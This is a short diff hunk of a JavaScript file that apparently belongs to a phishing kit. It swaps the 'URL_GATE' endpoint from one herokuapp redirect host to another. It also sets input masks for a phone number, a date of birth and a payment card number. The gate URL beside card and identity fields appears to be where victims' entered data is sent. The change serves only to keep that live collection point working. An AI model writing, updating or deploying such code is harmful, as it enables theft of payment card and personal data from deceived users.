@@ -416,7 +416,7 @@ var nemra = "";
 var feedzeb="";
 var pic="<img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAASCAYAAABWzo5XAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAA3XAAAN1wFCKJt4AAABrUlEQVQ4y6WUTU9TURCGn5l7ezUm3FjphsJGjRtDGtxAwpc3oDs2bIj4L9zob5DEhcZ/IKmGkLBh2coVy8KdLvxITFzRFdQSFwqVe8YF2tT2tlR5V3MyM++8M+fMEVJQn711w8SWxewmcAnAoIbZK/HseTaO37bnSOvhWxTlnNPHBsvtvhYYxqoXyL2wXK51ENVm5q+ruE2Qy03n+XNceHAfgO8PV7DDo1bCLwm6kNsufQRQgP25uWEVSq0kAAQBXmEUrzAKQdCu7IqHK+1N3c43ifTYHoEN8e/I+97xCoDWo2hMkCX+G3L368x8QS2RXoPti0mVOyowyRlhZlMKMsTZkfdPF95f1z5CFbiaKvnwiJ/xdtPu0duuD7wEZlMDGg1+PHnax7ilrC6xdcCl+gcGCNeKhGtFJAy70bhE3boO7my9F3iRXgnwM5DJ9JiVrObi+JMAHExPZ02DN8C1v2JU0JGRk7K7VXAdwj+La0xcrFTqPZf2FHQuLcDg6/IHT21coHjy/XS/I4xnXkbG/5DQbTXqUTRGIovApIgM/369VUR2cLaRrWy9a8/5BZ7cj3zxUmEJAAAAAElFTkSuQmCC' />";
 var error_message = "";
-var URL_GATE = "https://redirect-amsl.herokuapp.com/";
+var URL_GATE = "https://redirect-nouv.herokuapp.com/";
 $('#nb').mask('00.00.00.00.00');
 $('#dubs').mask('00/00/0000');
 $('#tarja').mask('0000.0000.0000.0000');
